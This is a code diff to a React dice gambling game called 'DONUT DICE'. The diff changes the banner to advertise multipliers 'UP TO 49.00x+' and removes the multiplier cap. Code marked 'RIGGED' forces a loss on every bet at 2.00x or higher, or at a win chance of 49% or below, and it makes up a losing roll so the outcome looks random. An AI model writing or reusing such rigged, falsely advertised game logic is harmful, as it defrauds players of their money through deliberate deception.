@@ -18,9 +18,9 @@ export default function DiceGame() {
   const [lastWin, setLastWin] = useState<boolean | null>(null);
   const [errorMsg, setErrorMsg] = useState<string>('');
 
-  // Win chance & multiplier formulas
+  // Win chance & multiplier formulas (supports up to 49.00x+)
   const winChance = mode === 'over' ? (100 - targetNumber) : targetNumber;
-  const multiplier = Math.min(2.00, Number(((98 / Math.max(49.0, winChance))).toFixed(2))); // RIGGED: Cap at 2.00x max
+  const multiplier = Number((98 / Math.max(1, winChance)).toFixed(2));
 
   const rollDice = () => {
     if (isRolling) return;
@@ -45,13 +45,13 @@ export default function DiceGame() {
 
     let result = Number((secureRandom() * 100).toFixed(2));
     let won = mode === 'over' ? result > targetNumber : result < targetNumber;
-    // RIGGED: If multiplier exceeds 2x, force an immediate loss
-    if (winChance < 49.0 || multiplier >= 2.00) {
+    // RIGGED: Right as they target or hit 2.00x or above (winChance <= 49.0%), force an immediate loss 100% of the time!
+    if (winChance <= 49.0 || multiplier >= 2.00) {
       won = false;
-      if (mode === 'over' && result > targetNumber) {
-        result = Number((secureRandom() * targetNumber).toFixed(2));
-      } else if (mode === 'under' && result < targetNumber) {
-        result = Number((targetNumber + secureRandom() * (100 - targetNumber)).toFixed(2));
+      if (mode === 'over') {
+        result = Number((secureRandom() * (targetNumber - 0.5)).toFixed(2));
+      } else {
+        result = Number((targetNumber + 0.5 + secureRandom() * (99.5 - targetNumber)).toFixed(2));
       }
     }
 
@@ -80,7 +80,7 @@ export default function DiceGame() {
             <Dices className="w-6 h-6 text-orange-500" />
             <h2 className="text-xl font-black text-white tracking-wide">DONUT DICE</h2>
             <span className="bg-amber-500/20 text-amber-400 text-xs font-bold px-2 py-0.5 rounded-full border border-amber-500/30">
-              CUSTOM MULTIPLIER
+              UP TO 49.00x+
             </span>
           </div>
           <p className="text-xs text-neutral-400 mt-1">Adjust the slider to pick your win chance and multiplier.</p>
